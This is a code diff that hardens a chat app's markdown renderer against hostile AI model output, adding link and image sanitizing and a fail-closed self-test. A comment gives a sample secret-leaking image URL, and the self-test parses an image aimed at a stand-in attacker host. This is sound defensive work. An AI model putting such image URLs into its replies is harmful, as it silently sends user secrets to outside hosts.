@@ -1,5 +1,13 @@
-import { Marked } from 'marked'
+import { Marked, type Token, type Tokens } from 'marked'
 import { markedHighlight } from 'marked-highlight'
+import {
+	allowedInlineTag,
+	escapeHtml,
+	safeUrl,
+	sameOriginImageSrc,
+	sanitizedText,
+	sanitizerHolds,
+} from '$lib/util/safe-markdown'
 import hljs from 'highlight.js/lib/core'
 import bash from 'highlight.js/lib/languages/bash'
 import css from 'highlight.js/lib/languages/css'
@@ -70,7 +78,63 @@ marked.setOptions({
 	breaks: true,
 })
 
+/*
+ * Everything rendered here is model output — replies, thinking, subagent results,
+ * ask_user questions — and it goes straight into `{@html}` on a page that can call every
+ * remote function as the user. So it is sanitized at the renderer (see
+ * `util/safe-markdown.ts` for the rules). This must be an object literal: `marked` only
+ * honours own enumerable properties of `use({ renderer })`.
+ */
+type ChatRendererThis = { parser: { parseInline(tokens: Token[]): string } }
+
+marked.use({
+	renderer: {
+		html({ text }: Tokens.HTML | Tokens.Tag): string {
+			return allowedInlineTag(text) ?? escapeHtml(text)
+		},
+
+		text: sanitizedText,
+
+		link(this: ChatRendererThis, { href, title, tokens }: Tokens.Link): string {
+			const inner = this.parser.parseInline(tokens)
+			const url = safeUrl(href)
+			if (!url) return inner
+			const titleAttr = title ? ` title="${escapeHtml(title)}"` : ''
+			const external = url.external ? ' target="_blank" rel="noopener noreferrer nofollow"' : ''
+			return `<a href="${escapeHtml(url.href)}"${external}${titleAttr}>${inner}</a>`
+		},
+
+		/**
+		 * Only our own origin loads inline. A remote image would be fetched the moment the
+		 * message renders, with whatever the URL carries — `![](https://x/?d=<secret>)` is
+		 * a zero-click leak — so it becomes a link the user can choose to open.
+		 */
+		image({ href, title, text }: Tokens.Image): string {
+			const alt = text ?? ''
+			const titleAttr = title ? ` title="${escapeHtml(title)}"` : ''
+			const local = sameOriginImageSrc(href)
+			if (local) return `<img src="${escapeHtml(local)}" alt="${escapeHtml(alt)}"${titleAttr} loading="lazy">`
+			const url = safeUrl(href)
+			if (!url) return escapeHtml(alt)
+			return `<a href="${escapeHtml(url.href)}" target="_blank" rel="noopener noreferrer nofollow" class="md-remote-image" title="Remote image, not loaded automatically">Image: ${escapeHtml(alt || url.href)}</a>`
+		},
+	},
+})
+
+/**
+ * Prove the overrides took effect before any message goes through them. A `marked`
+ * upgrade that changes how `use()` collects renderer methods would otherwise turn this
+ * back into an unsanitized pipe with no visible symptom.
+ */
+const CHAT_SANITIZER_INTACT =
+	sanitizerHolds((source) => marked.parse(source) as string) &&
+	!/<img/i.test(marked.parse('![x](https://attacker.example/leak)') as string)
+
 export function renderMarkdown(content: string) {
+	if (!CHAT_SANITIZER_INTACT) {
+		// Fail closed: show the text, render nothing.
+		return `<p>${escapeHtml(content ?? '').replace(/\n/g, '<br>')}</p>`
+	}
 	return marked.parse(content ?? '') as string
 }
 
